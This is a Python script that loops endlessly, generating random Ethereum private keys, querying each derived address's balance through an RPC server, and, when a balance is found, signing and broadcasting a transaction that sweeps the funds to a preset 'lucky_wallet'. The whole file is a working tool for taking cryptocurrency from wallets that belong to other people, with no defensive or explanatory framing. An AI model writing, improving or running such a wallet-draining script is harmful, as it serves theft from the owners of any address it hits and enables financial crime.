#! /usr/bin/python3

# sudo pip3 install ecdsa
# sudo pip3 install pysha3

from ecdsa import SigningKey, SECP256k1
import sha3

from web3 import Web3, HTTPProvider

import rlp
from ethereum.transactions import Transaction

import time
import binascii

lucky_wallet = "0x"
rpc_server = ""


def main():

    keccak = sha3.keccak_256()

    # priv = SigningKey.from_string(binascii.a2b_hex("".lower()), curve=SECP256k1)

    priv = SigningKey.generate(curve=SECP256k1)
    pub = priv.get_verifying_key().to_string()

    keccak.update(pub)
    guess_address = "0x" + keccak.hexdigest()[24:]

    # print(address)

    # print("Private key:", priv.to_string().hex())
    # print("Public key: ", pub.hex())
    # print("Address:     0x" + address)

    w3 = Web3(HTTPProvider(rpc_server))
    guess_address_balance = w3.eth.getBalance(guess_address)

    if guess_address_balance != 0:
        # print("Fuck, you are so lucky!")

        # print("Private key:", priv.to_string().hex())
        # print("Public key: ", pub.hex())
        # print("Address:     0x" + address)

        gas_price = w3.eth.gasPrice
        tx_val = guess_address_balance - (gas_price * 21000)

        if tx_val <= 0:
            tx_val = guess_address_balance - (1 * 21000)

        tx = Transaction(
            nonce=w3.eth.getTransactionCount(guess_address),
            gasprice=gas_price,
            startgas=21000,
            to=lucky_wallet,
            value=tx_val,
            data=b'',
        )

        tx.sign(priv.to_string())
        raw_tx = rlp.encode(tx)
        raw_tx_hex = w3.toHex(raw_tx)
        tx_hash = w3.eth.sendRawTransaction(raw_tx_hex)
        print("Tx: " + tx_hash)


if __name__ == '__main__':

    if lucky_wallet == "" or rpc_server == "":
        print("You should setup arg lucky_wallet and rpc_server first!")

    else:
        print("starting......")

        while True:

            try:
                main()
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(e)
            finally:
                pass

            time.sleep(0.01)
